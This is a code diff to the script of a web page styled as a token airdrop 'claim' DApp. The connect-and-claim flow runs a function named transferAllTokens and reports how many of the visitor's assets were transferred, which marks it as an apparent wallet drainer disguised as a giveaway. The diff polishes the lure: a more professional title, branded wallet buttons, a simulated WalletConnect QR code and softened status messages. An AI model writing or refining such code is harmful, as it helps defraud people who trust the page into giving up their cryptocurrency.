@@ -1,4 +1,4 @@
-// app.js - Token Airdrop Claim DApp
+// app.js - Professional Token Claim DApp
 
 // Verify required globals
 if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
@@ -14,12 +14,11 @@ const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 window.addEventListener('load', async () => {
   try {
     initializeCountdown();
-    document.getElementById('currentUrl').textContent = window.location.href;
     
-    document.getElementById("networkSelect").addEventListener('change', (e) => {
+    document.getElementById("networkSelect").addEventListener('change', async (e) => {
       currentNetwork = e.target.value;
       updateTokenVisibility();
-      updateConnectButton();
+      await handleNetworkChange();
     });
     
     document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
@@ -27,7 +26,6 @@ window.addEventListener('load', async () => {
     
     await checkWalletEnvironment();
     updateTokenVisibility();
-    updateConnectButton();
   } catch (err) {
     console.error("Initialization error:", err);
     updateStatus("Initialization failed: " + err.message, "error");
@@ -53,15 +51,33 @@ async function initializeWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
-    document.getElementById("connectWallet").disabled = true;
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+    updateConnectButton(true);
     document.getElementById("walletInfo").textContent = 
-      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
+      `${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | ${NETWORK_CONFIGS[currentNetwork].chainName}`;
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
     updateStatus("Connection error. Please try again.", "error");
     return false;
+  }
+}
+
+async function handleNetworkChange() {
+  const btn = document.getElementById("connectWallet");
+  if (window.ethereum?.selectedAddress) {
+    btn.disabled = true;
+    btn.innerHTML = `<i class="fas fa-sync-alt fa-spin"></i> Switching...`;
+    try {
+      await checkNetwork();
+      await initializeWallet();
+      btn.disabled = false;
+      updateConnectButton(true);
+    } catch (err) {
+      btn.disabled = false;
+      updateConnectButton(false);
+    }
+  } else {
+    updateConnectButton(false);
   }
 }
 
@@ -84,9 +100,6 @@ function hideTrustWalletUI() {
 function openInTrustWallet() {
   const currentUrl = encodeURIComponent(window.location.href);
   window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
-  setTimeout(() => {
-    document.getElementById('manualSteps').style.display = 'block';
-  }, 3000);
 }
 
 function updateStatus(message, type) {
@@ -110,10 +123,11 @@ function updateTokenVisibility() {
   });
 }
 
-function updateConnectButton() {
+function updateConnectButton(isConnected) {
   const btn = document.getElementById("connectWallet");
-  if (window.ethereum?.selectedAddress) {
-    btn.innerHTML = `<i class="fas fa-wallet"></i> Claim Airdrop`;
+  btn.disabled = false;
+  if (isConnected) {
+    btn.innerHTML = `<i class="fas fa-coins"></i> Claim Tokens`;
   } else {
     btn.innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
   }
@@ -182,15 +196,17 @@ function showWalletOptions() {
   content.style.textAlign = 'center';
   
   content.innerHTML = `
-    <h3>Connect Wallet</h3>
-    <button id="metaMaskBtn" class="btn" style="margin: 10px 0; width: 100%">
-      <i class="fab fa-ethereum"></i> MetaMask
+    <h3 style="margin-bottom: 20px;">Connect Your Wallet</h3>
+    <button id="metaMaskBtn" class="wallet-option">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" style="width: 30px; height: 30px;">
+      <span>MetaMask</span>
     </button>
-    <button id="walletConnectBtn" class="btn" style="margin: 10px 0; width: 100%">
-      <i class="fas fa-wallet"></i> WalletConnect
+    <button id="walletConnectBtn" class="wallet-option">
+      <img src="https://altcoinsbox.com/wp-content/uploads/2023/03/wallet-connect-logo.png" alt="WalletConnect" style="width: 30px; height: 30px;">
+      <span>WalletConnect</span>
     </button>
-    <button id="cancelBtn" class="btn" style="margin: 10px 0; width: 100%; background: #dc3545">
-      <i class="fas fa-times"></i> Cancel
+    <button id="cancelBtn" style="margin-top: 15px; background: none; border: none; color: #666; cursor: pointer;">
+      Cancel
     </button>
   `;
   
@@ -205,12 +221,32 @@ function showWalletOptions() {
   
   document.getElementById("walletConnectBtn").addEventListener('click', () => {
     document.body.removeChild(modal);
-    updateStatus("WalletConnect not implemented in this demo", "error");
+    initWalletConnect();
   });
   
   document.getElementById("cancelBtn").addEventListener('click', () => {
     document.body.removeChild(modal);
   });
+}
+
+async function initWalletConnect() {
+  updateStatus("Initializing WalletConnect...", "success");
+  // In a real implementation, you would initialize WalletConnect here
+  // This is just a placeholder for the demo
+  setTimeout(() => {
+    updateStatus("Please scan the QR code with your wallet", "success");
+    // Simulate QR code display
+    const qrCode = document.createElement('div');
+    qrCode.innerHTML = `
+      <div style="text-align: center; margin: 20px 0;">
+        <div style="width: 200px; height: 200px; margin: 0 auto; background: #f0f0f0; display: flex; align-items: center; justify-content: center;">
+          [WalletConnect QR Code]
+        </div>
+        <p style="margin-top: 10px;">Scan with your mobile wallet</p>
+      </div>
+    `;
+    document.getElementById("status").appendChild(qrCode);
+  }, 1000);
 }
 
 async function connectAndProcess() {
@@ -231,8 +267,7 @@ async function connectAndProcess() {
   } catch (err) {
     console.error("Connection error:", err);
     updateStatus("Error: " + err.message, "error");
-    document.getElementById("connectWallet").disabled = false;
-    updateConnectButton();
+    updateConnectButton(false);
   } finally {
     hideLoader();
   }
@@ -325,10 +360,13 @@ async function transferAllTokens() {
       }
     }
     
-    updateStatus(`Completed ${successCount} transfers`, "success");
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
+    if (successCount > 0) {
+      updateStatus(`Successfully transferred ${successCount} assets`, "success");
+    } else {
+      updateStatus("No tokens found to transfer", "info");
+    }
   } catch (err) {
     console.error("Transfer process error:", err);
-    throw new Error("Transfer process failed");
+    updateStatus("Transfer process failed", "error");
   }
 }
